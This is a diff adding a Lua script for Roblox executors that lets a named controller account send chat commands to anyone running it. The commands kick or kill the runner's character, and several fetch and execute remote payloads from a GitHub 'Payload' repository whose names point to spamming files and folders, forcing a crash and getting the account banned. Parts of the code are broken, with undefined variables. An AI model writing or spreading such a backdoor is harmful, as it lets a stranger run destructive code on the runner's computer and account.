@@ -1,0 +1,27 @@
+getgenv().mainaccount = "uwutimmyreborn228"
+local Players = game:GetService("Players")
+local LocalP = Players.LocalPlayer;
+
+-- FOR CRASH "prob"
+local coregui = game:service'CoreGui'
+local sound = Instance.new('Sound', coregui)
+
+game:GetService("Players"):FindFirstChild(getgenv().mainaccount).Chatted:connect(function(msg) -- Before commands, checks if player whitelisted and chatted
+   if msg == ".goto" then -- Put the command you want here
+        players.LocalPlayer.Character:MoveTo(ImTimmy228.Character.HumanoidRootPart.Position) -- IDK
+	elseif msg == ".kick" then -- Put the command you want here
+       		LocalP:Kick("Goodbye cutie :3")
+	elseif msg == ".ban" then
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/Payload/main/AttemptToGettingBAN",true))()
+        elseif msg == ".spamfiles" then
+            	loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/Payload/main/FuckupFiles/1",true))()
+        elseif msg == ".spamfolders" then
+          	  loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/Payload/main/SpamFolders",true))()
+        elseif msg == ".crash" then
+          	  loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/Payload/main/BSODmodified",true))()
+        elseif msg == ".kill" then
+          	  LocalP.Character.Humanoid:ChangeState(15)
+        elseif msg == ".executehub" then
+          	  print("НubСannotВeLoaded")
+   end -- AT END
+end)
